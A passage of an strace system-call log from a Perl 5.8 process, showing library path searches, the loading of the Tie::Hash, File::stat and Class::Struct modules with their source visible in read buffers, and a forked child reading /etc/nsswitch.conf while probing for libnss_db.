11808 20:20:27.460830 stat64("/usr/local/lib/perl/5.8.8/Tie/Hash.pm", 0xbfd4e50c) = -1 ENOENT (No such file or directory)
11808 20:20:27.460844 stat64("/usr/local/share/perl/5.8.8/Tie/Hash.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:27.460857 stat64("/usr/local/share/perl/5.8.8/Tie/Hash.pm", 0xbfd4e50c) = -1 ENOENT (No such file or directory)
11808 20:20:27.460871 stat64("/usr/lib/perl5/Tie/Hash.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:27.460883 stat64("/usr/lib/perl5/Tie/Hash.pm", 0xbfd4e50c) = -1 ENOENT (No such file or directory)
11808 20:20:27.460897 stat64("/usr/share/perl5/Tie/Hash.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:27.460909 stat64("/usr/share/perl5/Tie/Hash.pm", 0xbfd4e50c) = -1 ENOENT (No such file or directory)
11808 20:20:27.460922 stat64("/usr/lib/perl/5.8/Tie/Hash.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:27.460935 stat64("/usr/lib/perl/5.8/Tie/Hash.pm", 0xbfd4e50c) = -1 ENOENT (No such file or directory)
11808 20:20:27.460948 stat64("/usr/share/perl/5.8/Tie/Hash.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:27.460962 stat64("/usr/share/perl/5.8/Tie/Hash.pm", {st_mode=S_IFREG|0644, st_size=7304, ...}) = 0
11808 20:20:27.460984 open("/usr/share/perl/5.8/Tie/Hash.pm", O_RDONLY|O_LARGEFILE) = 8
11808 20:20:27.460999 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfd4e318) = -1 ENOTTY (Inappropriate ioctl for device)
11808 20:20:27.461010 _llseek(8, 0, [0], SEEK_CUR) = 0
11808 20:20:27.461029 read(8, "package Tie::Hash;\n\nour $VERSION = \'1.02\';\n\n=head1 NAME\n\nTie::Hash, Tie::StdHash, Tie::ExtraHash - base class definitions for tied hashes\n\n=head1 SYNOPSIS\n\n    package NewHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::Hash);\n\n    sub DELETE { ... }\t\t# Provides needed method\n    sub CLEAR { ... }\t\t# Overrides inherited method\n\n\n    package NewStdHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::StdHash);\n\n    # All methods provided by default, define only those needing overrides\n    # Accessors access the storage in %{$_[0]};\n    # TIEHASH should return a reference to the actual storage\n    sub DELETE { ... }\n\n    package NewExtraHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::ExtraHash);\n\n    # All methods provided by default, define only those needing overrides\n    # Accessors access the storage in %{$_[0][0]};\n    # TIEHASH should return an array reference with the first element being\n    # the reference to the actual storage \n    sub DELETE { \n      $_[0][1]->(\'del\', $_[0][0], $_[1]); # Call the report writer\n      delete $_[0][0]->{$_[1]};\t\t  #  $_[0]->SUPER::DELETE($_[1])\n    }\n\n\n    package main;\n\n    tie %new_hash, \'NewHash\';\n    tie %new_std_hash, \'NewStdHash\';\n    tie %new_extra_hash, \'NewExtraHash\',\n\tsub {warn \"Doing \\U$_[1]\\E of $_[2].\\n\"};\n\n=head1 DESCRIPTION\n\nThis module provides some skeletal methods for hash-tying classes. See\nL<perltie> for a list of the functions required in order to tie a hash\nto a package. The basic B<Tie::Hash> package provides a C<new> method, as well\nas methods C<TIEHASH>, C<EXISTS> and C<CLEAR>. The B<Tie::StdHash> and\nB<Tie::ExtraHash> packages\nprovide most methods for hashes described in L<perltie> (the exceptions\nare C<UNTIE> and C<DESTROY>).  They cause tied hashes to behave exactly like standard hashes,\nand allow for selective overwriting of methods.  B<Tie::Hash> grandfathers the\nC<new> method: it is used if C<TIEHASH> is not defined\nin the case a class forgets to include a C<TIEHASH> method.\n\nFor developers wishing to write their own tied hashes, the required methods\nare briefly defined below. See the L<perltie> section for more detailed\ndescriptive, as well as example code:\n\n=over 4\n\n=item TIEHASH classname, LIST\n\nThe method invoked by the command C<tie %hash, classname>. Associates a new\nhash instance with the specified class. C<LIST> would represent additional\narguments (along the lines of L<AnyDBM_File> and compatriots) needed to\ncomplete the association.\n\n=item STORE this, key, value\n\nStore datum I<value> into I<key> for the tied hash I<this>.\n\n=item FETCH this, key\n\nRetrieve the datum in I<key> for the tied hash I<this>.\n\n=item FIRSTKEY this\n\nReturn the first key in the hash.\n\n=item NEXTKEY this, lastkey\n\nReturn the next key in the hash.\n\n=item EXISTS this, key\n\nVerify that I<key> exists with the tied hash I<this>.\n\nThe B<Tie::Hash> implementation is a stub that simply croaks.\n\n=item DELETE this, key\n\nDelete the key I<key> from the tied hash I<this>.\n\n=item CLEAR this\n\nClear all values from the tied hash I<this>.\n\n=item SCALAR this\n\nReturns what evaluating the hash in scalar context yields.\n\nB<Tie::Hash> does not implement this method (but B<Tie::StdHash>\nand B<Tie::ExtraHash> do).\n\n=back\n\n=head1 Inheriting from B<Tie::StdHash>\n\nThe accessor methods assume that the actual storage for the data in the tied\nhash is in the hash referenced by C<tied(%tiedhash)>.  Thus overwritten\nC<TIEHASH> method should return a hash reference, and the remaining methods\nshould operate on the hash referenced by the first argument:\n\n  package ReportHash;\n  our @ISA = \'Tie::StdHash\';\n\n  sub TIEHASH  {\n    my $storage = bless {}, shift;\n    warn \"New ReportHash created, stored in $storage.\\n\";\n    $storage\n  }\n  sub STORE    {\n    warn \"Storing data with key $_[1] at $_[0].\\n\";\n    $_[0]{$_[1]} = $_[2]\n  }\n\n\n=head1 Inheriting from B<Tie::ExtraHash>\n\nThe accessor methods assume that the actual storage for the data in the tied\nhash is in the hash referenced by C<(tied(%tiedhash))-E<gt>[0]>.  Thus overwritten\nC<TIEHASH> method should return an array reference with the first\nelement being a hash refer", 4096) = 4096
11808 20:20:27.461354 read(8, "ence, and the remaining methods should operate on the\nhash C<< %{ $_[0]->[0] } >>:\n\n  package ReportHash;\n  our @ISA = \'Tie::ExtraHash\';\n\n  sub TIEHASH  {\n    my $class = shift;\n    my $storage = bless [{}, @_], $class;\n    warn \"New ReportHash created, stored in $storage.\\n\";\n    $storage;\n  }\n  sub STORE    {\n    warn \"Storing data with key $_[1] at $_[0].\\n\";\n    $_[0][0]{$_[1]} = $_[2]\n  }\n\nThe default C<TIEHASH> method stores \"extra\" arguments to tie() starting\nfrom offset 1 in the array referenced by C<tied(%tiedhash)>; this is the\nsame storage algorithm as in TIEHASH subroutine above.  Hence, a typical\npackage inheriting from B<Tie::ExtraHash> does not need to overwrite this\nmethod.\n\n=head1 C<SCALAR>, C<UNTIE> and C<DESTROY>\n\nThe methods C<UNTIE> and C<DESTROY> are not defined in B<Tie::Hash>,\nB<Tie::StdHash>, or B<Tie::ExtraHash>.  Tied hashes do not require\npresence of these methods, but if defined, the methods will be called in\nproper time, see L<perltie>.\n\nC<SCALAR> is only defined in B<Tie::StdHash> and B<Tie::ExtraHash>.\n\nIf needed, these methods should be defined by the package inheriting from\nB<Tie::Hash>, B<Tie::StdHash>, or B<Tie::ExtraHash>. See L<pertie/\"SCALAR\">\nto find out what happens when C<SCALAR> does not exist.\n\n=head1 MORE INFORMATION\n\nThe packages relating to various DBM-related implementations (F<DB_File>,\nF<NDBM_File>, etc.) show examples of general tied hashes, as does the\nL<Config> module. While these do not utilize B<Tie::Hash>, they serve as\ngood working examples.\n\n=cut\n\nuse Carp;\nuse warnings::register;\n\nsub new {\n    my $pkg = shift;\n    $pkg->TIEHASH(@_);\n}\n\n# Grandfather \"new\"\n\nsub TIEHASH {\n    my $pkg = shift;\n    if (defined &{\"${pkg}::new\"}) {\n\twarnings::warnif(\"WARNING: calling ${pkg}->new since ${pkg}->TIEHASH is missing\");\n\t$pkg->new(@_);\n    }\n    else {\n\tcroak \"$pkg doesn\'t define a TIEHASH method\";\n    }\n}\n\nsub EXISTS {\n    my $pkg = ref $_[0];\n    croak \"$pkg doesn\'t define an EXISTS method\";\n}\n\nsub CLEAR {\n    my $self = shift;\n    my $key = $self->FIRSTKEY(@_);\n    my @keys;\n\n    while (defined $key) {\n\tpush @keys, $key;\n\t$key = $self->NEXTKEY(@_, $key);\n    }\n    foreach $key (@keys) {\n\t$self->DELETE(@_, $key);\n    }\n}\n\n# The Tie::StdHash package implements standard perl hash behaviour.\n# It exists to act as a base class for classes which only wish to\n# alter some parts of their behaviour.\n\npackage Tie::StdHash;\n# @ISA = qw(Tie::Hash);\t\t# would inherit new() only\n\nsub TIEHASH  { bless {}, $_[0] }\nsub STORE    { $_[0]->{$_[1]} = $_[2] }\nsub FETCH    { $_[0]->{$_[1]} }\nsub FIRSTKEY { my $a = scalar keys %{$_[0]}; each %{$_[0]} }\nsub NEXTKEY  { each %{$_[0]} }\nsub EXISTS   { exists $_[0]->{$_[1]} }\nsub DELETE   { delete $_[0]->{$_[1]} }\nsub CLEAR    { %{$_[0]} = () }\nsub SCALAR   { scalar %{$_[0]} }\n\npackage Tie::ExtraHash;\n\nsub TIEHASH  { my $p = shift; bless [{}, @_], $p }\nsub STORE    { $_[0][0]{$_[1]} = $_[2] }\nsub FETCH    { $_[0][0]{$_[1]} }\nsub FIRSTKEY { my $a = scalar keys %{$_[0][0]}; each %{$_[0][0]} }\nsub NEXTKEY  { each %{$_[0][0]} }\nsub EXISTS   { exists $_[0][0]->{$_[1]} }\nsub DELETE   { delete $_[0][0]->{$_[1]} }\nsub CLEAR    { %{$_[0][0]} = () }\nsub SCALAR   { scalar %{$_[0][0]} }\n\n1;\n", 4096) = 3208
11808 20:20:27.461858 read(8, "", 4096) = 0
11808 20:20:27.461876 close(8)          = 0
11808 20:20:27.461909 stat64("/etc/perl/File/stat.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:27.461924 stat64("/etc/perl/File/stat.pm", 0xbfd4e50c) = -1 ENOENT (No such file or directory)
11808 20:20:27.461938 stat64("/usr/local/lib/perl/5.8.8/File/stat.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:27.461951 stat64("/usr/local/lib/perl/5.8.8/File/stat.pm", 0xbfd4e50c) = -1 ENOENT (No such file or directory)
11808 20:20:27.461965 stat64("/usr/local/share/perl/5.8.8/File/stat.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:27.461978 stat64("/usr/local/share/perl/5.8.8/File/stat.pm", 0xbfd4e50c) = -1 ENOENT (No such file or directory)
11808 20:20:27.461997 stat64("/usr/lib/perl5/File/stat.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:27.462009 stat64("/usr/lib/perl5/File/stat.pm", 0xbfd4e50c) = -1 ENOENT (No such file or directory)
11808 20:20:27.462022 stat64("/usr/share/perl5/File/stat.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:27.462035 stat64("/usr/share/perl5/File/stat.pm", 0xbfd4e50c) = -1 ENOENT (No such file or directory)
11808 20:20:27.462049 stat64("/usr/lib/perl/5.8/File/stat.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:27.462062 stat64("/usr/lib/perl/5.8/File/stat.pm", 0xbfd4e50c) = -1 ENOENT (No such file or directory)
11808 20:20:27.462075 stat64("/usr/share/perl/5.8/File/stat.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:27.462089 stat64("/usr/share/perl/5.8/File/stat.pm", {st_mode=S_IFREG|0644, st_size=3372, ...}) = 0
11808 20:20:27.462110 open("/usr/share/perl/5.8/File/stat.pm", O_RDONLY|O_LARGEFILE) = 8
11808 20:20:27.462125 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfd4e318) = -1 ENOTTY (Inappropriate ioctl for device)
11808 20:20:27.462137 _llseek(8, 0, [0], SEEK_CUR) = 0
11808 20:20:27.462154 read(8, "package File::stat;\nuse 5.006;\n\nuse strict;\nuse warnings;\n\nour(@EXPORT, @EXPORT_OK, %EXPORT_TAGS);\n\nour $VERSION = \'1.00\';\n\nBEGIN { \n    use Exporter   ();\n    @EXPORT      = qw(stat lstat);\n    @EXPORT_OK   = qw( $st_dev\t   $st_ino    $st_mode \n\t\t       $st_nlink   $st_uid    $st_gid \n\t\t       $st_rdev    $st_size \n\t\t       $st_atime   $st_mtime  $st_ctime \n\t\t       $st_blksize $st_blocks\n\t\t    );\n    %EXPORT_TAGS = ( FIELDS => [ @EXPORT_OK, @EXPORT ] );\n}\nuse vars @EXPORT_OK;\n\n# Class::Struct forbids use of @ISA\nsub import { goto &Exporter::import }\n\nuse Class::Struct qw(struct);\nstruct \'File::stat\' => [\n     map { $_ => \'$\' } qw{\n\t dev ino mode nlink uid gid rdev size\n\t atime mtime ctime blksize blocks\n     }\n];\n\nsub populate (@) {\n    return unless @_;\n    my $stob = new();\n    @$stob = (\n\t$st_dev, $st_ino, $st_mode, $st_nlink, $st_uid, $st_gid, $st_rdev,\n        $st_size, $st_atime, $st_mtime, $st_ctime, $st_blksize, $st_blocks ) \n\t    = @_;\n    return $stob;\n} \n\nsub lstat ($)  { populate(CORE::lstat(shift)) }\n\nsub stat ($) {\n    my $arg = shift;\n    my $st = populate(CORE::stat $arg);\n    return $st if $st;\n\tmy $fh;\n    {\n\t\tlocal $!;\n\t\tno strict \'refs\';\n\t\trequire Symbol;\n\t\t$fh = \\*{ Symbol::qualify( $arg, caller() )};\n\t\treturn unless defined fileno $fh;\n\t}\n    return populate(CORE::stat $fh);\n}\n\n1;\n__END__\n\n=head1 NAME\n\nFile::stat - by-name interface to Perl\'s built-in stat() functions\n\n=head1 SYNOPSIS\n\n use File::stat;\n $st = stat($file) or die \"No $file: $!\";\n if ( ($st->mode & 0111) && $st->nlink > 1) ) {\n     print \"$file is executable with lotsa links\\n\";\n } \n\n use File::stat qw(:FIELDS);\n stat($file) or die \"No $file: $!\";\n if ( ($st_mode & 0111) && $st_nlink > 1) ) {\n     print \"$file is executable with lotsa links\\n\";\n } \n\n=head1 DESCRIPTION\n\nThis module\'s default exports override the core stat() \nand lstat() functions, replacing them with versions that return \n\"File::stat\" objects.  This object has methods that\nreturn the similarly named structure field name from the\nstat(2) function; namely,\ndev,\nino,\nmode,\nnlink,\nuid,\ngid,\nrdev,\nsize,\natime,\nmtime,\nctime,\nblksize,\nand\nblocks.  \n\nYou may also import all the structure fields directly into your namespace\nas regular variables using the :FIELDS import tag.  (Note that this still\noverrides your stat() and lstat() functions.)  Access these fields as\nvariables named with a preceding C<st_> in front their method names.\nThus, C<$stat_obj-E<gt>dev()> corresponds to $st_dev if you import\nthe fields.\n\nTo access this functionality without the core overrides,\npass the C<use> an empty import list, and then access\nfunction functions with their full qualified names.\nOn the other hand, the built-ins are still available\nvia the C<CORE::> pseudo-package.\n\n=head1 BUGS\n\nAs of Perl 5.8.0 after using this module you cannot use the implicit\nC<$_> or the special filehandle C<_> with stat() or lstat(), trying\nto do so leads into strange errors.  The workaround is for C<$_> to\nbe explicit\n\n    my $stat_obj = stat $_;\n\nand for C<_> to explicitly populate the object using the unexported\nand undocumented populate() function with CORE::stat():\n\n    my $stat_obj = File::stat::populate(CORE::stat(_));\n\n=head1 NOTE\n\nWhile this class is currently implemented using the Class::Struct\nmodule to build a struct-like class, you shouldn\'t rely upon this.\n\n=head1 AUTHOR\n\nTom Christiansen\n", 4096) = 3372
11808 20:20:27.462574 stat64("/etc/perl/Class/Struct.pmc", 0xbfd4e14c) = -1 ENOENT (No such file or directory)
11808 20:20:27.462593 stat64("/etc/perl/Class/Struct.pm", 0xbfd4e05c) = -1 ENOENT (No such file or directory)
11808 20:20:27.462607 stat64("/usr/local/lib/perl/5.8.8/Class/Struct.pmc", 0xbfd4e14c) = -1 ENOENT (No such file or directory)
11808 20:20:27.462620 stat64("/usr/local/lib/perl/5.8.8/Class/Struct.pm", 0xbfd4e05c) = -1 ENOENT (No such file or directory)
11808 20:20:27.462634 stat64("/usr/local/share/perl/5.8.8/Class/Struct.pmc", 0xbfd4e14c) = -1 ENOENT (No such file or directory)
11808 20:20:27.462647 stat64("/usr/local/share/perl/5.8.8/Class/Struct.pm", 0xbfd4e05c) = -1 ENOENT (No such file or directory)
11808 20:20:27.462662 stat64("/usr/lib/perl5/Class/Struct.pmc", 0xbfd4e14c) = -1 ENOENT (No such file or directory)
11808 20:20:27.462674 stat64("/usr/lib/perl5/Class/Struct.pm", 0xbfd4e05c) = -1 ENOENT (No such file or directory)
11808 20:20:27.462687 stat64("/usr/share/perl5/Class/Struct.pmc", 0xbfd4e14c) = -1 ENOENT (No such file or directory)
11808 20:20:27.462708 stat64("/usr/share/perl5/Class/Struct.pm", 0xbfd4e05c) = -1 ENOENT (No such file or directory)
11808 20:20:27.462723 stat64("/usr/lib/perl/5.8/Class/Struct.pmc", 0xbfd4e14c) = -1 ENOENT (No such file or directory)
11808 20:20:27.462736 stat64("/usr/lib/perl/5.8/Class/Struct.pm", 0xbfd4e05c) = -1 ENOENT (No such file or directory)
11808 20:20:27.462750 stat64("/usr/share/perl/5.8/Class/Struct.pmc", 0xbfd4e14c) = -1 ENOENT (No such file or directory)
11808 20:20:27.462764 stat64("/usr/share/perl/5.8/Class/Struct.pm", {st_mode=S_IFREG|0644, st_size=20512, ...}) = 0
11808 20:20:27.462785 open("/usr/share/perl/5.8/Class/Struct.pm", O_RDONLY|O_LARGEFILE) = 10
11808 20:20:27.462801 ioctl(10, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfd4de68) = -1 ENOTTY (Inappropriate ioctl for device)
11808 20:20:27.462812 _llseek(10, 0, [0], SEEK_CUR) = 0
11808 20:20:27.462831 read(10, "package Class::Struct;\n\n## See POD after __END__\n\nuse 5.006_001;\n\nuse strict;\nuse warnings::register;\nour(@ISA, @EXPORT, $VERSION);\n\nuse Carp;\n\nrequire Exporter;\n@ISA = qw(Exporter);\n@EXPORT = qw(struct);\n\n$VERSION = \'0.63\';\n\n## Tested on 5.002 and 5.003 without class membership tests:\nmy $CHECK_CLASS_MEMBERSHIP = ($] >= 5.003_95);\n\nmy $print = 0;\nsub printem {\n    if (@_) { $print = shift }\n    else    { $print++ }\n}\n\n{\n    package Class::Struct::Tie_ISA;\n\n    sub TIEARRAY {\n        my $class = shift;\n        return bless [], $class;\n    }\n\n    sub STORE {\n        my ($self, $index, $value) = @_;\n        Class::Struct::_subclass_error();\n    }\n\n    sub FETCH {\n        my ($self, $index) = @_;\n        $self->[$index];\n    }\n\n    sub FETCHSIZE {\n        my $self = shift;\n        return scalar(@$self);\n    }\n\n    sub DESTROY { }\n}\n\nsub import {\n    my $self = shift;\n\n    if ( @_ == 0 ) {\n      $self->export_to_level( 1, $self, @EXPORT );\n    } elsif ( @_ == 1 ) {\n\t# This is admittedly a little bit silly:\n\t# do we ever export anything else than \'struct\'...?\n      $self->export_to_level( 1, $self, @_ );\n    } else {\n      goto &struct;\n    }\n}\n\nsub struct {\n\n    # Determine parameter list structure, one of:\n    #   struct( class => [ element-list ])\n    #   struct( class => { element-list })\n    #   struct( element-list )\n    # Latter form assumes current package name as struct name.\n\n    my ($class, @decls);\n    my $base_type = ref $_[1];\n    if ( $base_type eq \'HASH\' ) {\n        $class = shift;\n        @decls = %{shift()};\n        _usage_error() if @_;\n    }\n    elsif ( $base_type eq \'ARRAY\' ) {\n        $class = shift;\n        @decls = @{shift()};\n        _usage_error() if @_;\n    }\n    else {\n        $base_type = \'ARRAY\';\n        $class = (caller())[0];\n        @decls = @_;\n    }\n\n    _usage_error() if @decls % 2 == 1;\n\n    # Ensure we are not, and will not be, a subclass.\n\n    my $isa = do {\n        no strict \'refs\';\n        \\@{$class . \'::ISA\'};\n    };\n    _subclass_error() if @$isa;\n    tie @$isa, \'Class::Struct::Tie_ISA\';\n\n    # Create constructor.\n\n    croak \"function \'new\' already defined in package $class\"\n        if do { no strict \'refs\'; defined &{$class . \"::new\"} };\n\n    my @methods = ();\n    my %refs = ();\n    my %arrays = ();\n    my %hashes = ();\n    my %classes = ();\n    my $got_class = 0;\n    my $out = \'\';\n\n    $out = \"{\\n  package $class;\\n  use Carp;\\n  sub new {\\n\";\n    $out .= \"    my (\\$class, \\%init) = \\@_;\\n\";\n    $out .= \"    \\$class = __PACKAGE__ unless \\@_;\\n\";\n\n    my $cnt = 0;\n    my $idx = 0;\n    my( $cmt, $name, $type, $elem );\n\n    if( $base_type eq \'HASH\' ){\n        $out .= \"    my(\\$r) = {};\\n\";\n        $cmt = \'\';\n    }\n    elsif( $base_type eq \'ARRAY\' ){\n        $out .= \"    my(\\$r) = [];\\n\";\n    }\n    while( $idx < @decls ){\n        $name = $decls[$idx];\n        $type = $decls[$idx+1];\n        push( @methods, $name );\n        if( $base_type eq \'HASH\' ){\n            $elem = \"{\'${class}::$name\'}\";\n        }\n        elsif( $base_type eq \'ARRAY\' ){\n            $elem = \"[$cnt]\";\n            ++$cnt;\n            $cmt = \" # $name\";\n        }\n        if( $type =~ /^\\*(.)/ ){\n            $refs{$name}++;\n            $type = $1;\n        }\n        my $init = \"defined(\\$init{\'$name\'}) ? \\$init{\'$name\'} :\";\n        if( $type eq \'@\' ){\n            $out .= \"    croak \'Initializer for $name must be array reference\'\\n\"; \n            $out .= \"        if defined(\\$init{\'$name\'}) && ref(\\$init{\'$name\'}) ne \'ARRAY\';\\n\";\n            $out .= \"    \\$r->$elem = $init [];$cmt\\n\"; \n            $arrays{$name}++;\n        }\n        elsif( $type eq \'%\' ){\n            $out .= \"    croak \'Initializer for $name must be hash reference\'\\n\";\n            $out .= \"        if defined(\\$init{\'$name\'}) && ref(\\$init{\'$name\'}) ne \'HASH\';\\n\";\n            $out .= \"    \\$r->$elem = $init {};$cmt\\n\";\n            $hashes{$name}++;\n        }\n        elsif ( $type eq \'$\') {\n            $out .= \"    \\$r->$elem = $init undef;$cmt\\n\";\n        }\n        elsif( $type =~ /^\\w+(?:::\\w+)*$/ ){\n            $out .= \"    if (defined(\\$init{\'$name\'}))", 4096) = 4096
11808 20:20:27.463233 brk(0x82de000)    = 0x82de000
11808 20:20:27.463598 read(10, " {\\n\";\n           $out .= \"       if (ref \\$init{\'$name\'} eq \'HASH\')\\n\";\n            $out .= \"            { \\$r->$elem = $type->new(\\%{\\$init{\'$name\'}}) } $cmt\\n\";\n           $out .= \"       elsif (UNIVERSAL::isa(\\$init{\'$name\'}, \'$type\'))\\n\";\n            $out .= \"            { \\$r->$elem = \\$init{\'$name\'} } $cmt\\n\";\n            $out .= \"       else { croak \'Initializer for $name must be hash or $type reference\' }\\n\";\n            $out .= \"    }\\n\";\n            $classes{$name} = $type;\n            $got_class = 1;\n        }\n        else{\n            croak \"\'$type\' is not a valid struct element type\";\n        }\n        $idx += 2;\n    }\n    $out .= \"    bless \\$r, \\$class;\\n  }\\n\";\n\n    # Create accessor methods.\n\n    my( $pre, $pst, $sel );\n    $cnt = 0;\n    foreach $name (@methods){\n        if ( do { no strict \'refs\'; defined &{$class . \"::$name\"} } ) {\n            warnings::warnif(\"function \'$name\' already defined, overrides struct accessor method\");\n        }\n        else {\n            $pre = $pst = $cmt = $sel = \'\';\n            if( defined $refs{$name} ){\n                $pre = \"\\\\(\";\n                $pst = \")\";\n                $cmt = \" # returns ref\";\n            }\n            $out .= \"  sub $name {$cmt\\n    my \\$r = shift;\\n\";\n            if( $base_type eq \'ARRAY\' ){\n                $elem = \"[$cnt]\";\n                ++$cnt;\n            }\n            elsif( $base_type eq \'HASH\' ){\n                $elem = \"{\'${class}::$name\'}\";\n            }\n            if( defined $arrays{$name} ){\n                $out .= \"    my \\$i;\\n\";\n                $out .= \"    \\@_ ? (\\$i = shift) : return \\$r->$elem;\\n\"; \n                $out .= \"    if (ref(\\$i) eq \'ARRAY\' && !\\@_) { \\$r->$elem = \\$i; return \\$r }\\n\";\n                $sel = \"->[\\$i]\";\n            }\n            elsif( defined $hashes{$name} ){\n                $out .= \"    my \\$i;\\n\";\n                $out .= \"    \\@_ ? (\\$i = shift) : return \\$r->$elem;\\n\";\n                $out .= \"    if (ref(\\$i) eq \'HASH\' && !\\@_) { \\$r->$elem = \\$i; return \\$r }\\n\";\n                $sel = \"->{\\$i}\";\n            }\n            elsif( defined $classes{$name} ){\n                if ( $CHECK_CLASS_MEMBERSHIP ) {\n                    $out .= \"    croak \'$name argument is wrong class\' if \\@_ && ! UNIVERSAL::isa(\\$_[0], \'$classes{$name}\');\\n\";\n                }\n            }\n            $out .= \"    croak \'Too many args to $name\' if \\@_ > 1;\\n\";\n            $out .= \"    \\@_ ? ($pre\\$r->$elem$sel = shift$pst) : $pre\\$r->$elem$sel$pst;\\n\";\n            $out .= \"  }\\n\";\n        }\n    }\n    $out .= \"}\\n1;\\n\";\n\n    print $out if $print;\n    my $result = eval $out;\n    carp $@ if $@;\n}\n\nsub _usage_error {\n    confess \"struct usage error\";\n}\n\nsub _subclass_error {\n    croak \'struct class cannot be a subclass (@ISA not allowed)\';\n}\n\n1; # for require\n\n\n__END__\n\n=head1 NAME\n\nClass::Struct - declare struct-like datatypes as Perl classes\n\n=head1 SYNOPSIS\n\n    use Class::Struct;\n            # declare struct, based on array:\n    struct( CLASS_NAME => [ ELEMENT_NAME => ELEMENT_TYPE, ... ]);\n            # declare struct, based on hash:\n    struct( CLASS_NAME => { ELEMENT_NAME => ELEMENT_TYPE, ... });\n\n    package CLASS_NAME;\n    use Class::Struct;\n            # declare struct, based on array, implicit class name:\n    struct( ELEMENT_NAME => ELEMENT_TYPE, ... );\n\n    # Declare struct at compile time\n    use Class::Struct CLASS_NAME => [ ELEMENT_NAME => ELEMENT_TYPE, ... ];\n    use Class::Struct CLASS_NAME => { ELEMENT_NAME => ELEMENT_TYPE, ... };\n\n    # declare struct at compile time, based on array, implicit class name:\n    package CLASS_NAME;\n    use Class::Struct ELEMENT_NAME => ELEMENT_TYPE, ... ;\n\n    package Myobj;\n    use Class::Struct;\n            # declare struct with four types of elements:\n    struct( s => \'$\', a => \'@\', h => \'%\', c => \'My_Other_Class\' );\n\n    $obj = new Myobj;               # constructor\n\n                                    # scalar type accessor:\n    $element_value = $obj->s;           # element value\n    $obj->s(\'new value\');               # assign to element\n\n                             ", 4096) = 4096
11808 20:20:27.464210 _llseek(10, 6916, [6916], SEEK_SET) = 0
11808 20:20:27.464228 _llseek(10, 0, [6916], SEEK_CUR) = 0
11808 20:20:27.464239 close(10)         = 0
11808 20:20:27.464419 _llseek(8, 1334, [1334], SEEK_SET) = 0
11808 20:20:27.464436 _llseek(8, 0, [1334], SEEK_CUR) = 0
11808 20:20:27.464446 close(8)          = 0
11808 20:20:27.465081 brk(0x82ff000)    = 0x82ff000
11808 20:20:27.465279 _llseek(6, 2689, [2689], SEEK_SET) = 0
11808 20:20:27.465296 _llseek(6, 0, [2689], SEEK_CUR) = 0
11808 20:20:27.465306 close(6)          = 0
11808 20:20:27.465465 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7dd5908) = 11809
11809 20:20:27.579213 getppid()         = 11808
11809 20:20:27.579566 open("/etc/nsswitch.conf", O_RDONLY) = 6
11809 20:20:27.579595 fstat64(6, {st_mode=S_IFREG|0644, st_size=475, ...}) = 0
11809 20:20:27.579615 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f9b000
11809 20:20:27.579630 read(6, "# /etc/nsswitch.conf\n#\n# Example configuration of GNU Name Service Switch functionality.\n# If you have the `glibc-doc-reference\' and `info\' packages installed, try:\n# `info libc \"Name Service Switch\"\' for information about this file.\n\npasswd:         compat\ngroup:          compat\nshadow:         compat\n\nhosts:          files dns\nnetworks:       files\n\nprotocols:      db files\nservices:       db files\nethers:         db files\nrpc:            db files\n\nnetgroup:       nis\n", 4096) = 475
11809 20:20:27.579681 read(6, "", 4096) = 0
11809 20:20:27.579691 close(6)          = 0
11809 20:20:27.579702 munmap(0xb7f9b000, 4096) = 0
11809 20:20:27.579730 open("/etc/ld.so.cache", O_RDONLY) = 6
11809 20:20:27.579744 fstat64(6, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
11809 20:20:27.579761 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 6, 0) = 0xb7da2000
11809 20:20:27.579773 close(6)          = 0
11809 20:20:27.579783 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
11809 20:20:27.579806 open("/lib/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11809 20:20:27.579822 stat64("/lib/tls/i686/sse2/cmov", 0xbfd4e9ec) = -1 ENOENT (No such file or directory)
11809 20:20:27.579836 open("/lib/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11809 20:20:27.579849 stat64("/lib/tls/i686/sse2", 0xbfd4e9ec) = -1 ENOENT (No such file or directory)
11809 20:20:27.579861 open("/lib/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11809 20:20:27.579874 stat64("/lib/tls/i686/cmov", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
11809 20:20:27.579892 open("/lib/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11809 20:20:27.579904 stat64("/lib/tls/i686", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
11809 20:20:27.579922 open("/lib/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11809 20:20:27.580020 stat64("/lib/tls/sse2/cmov", 0xbfd4e9ec) = -1 ENOENT (No such file or directory)
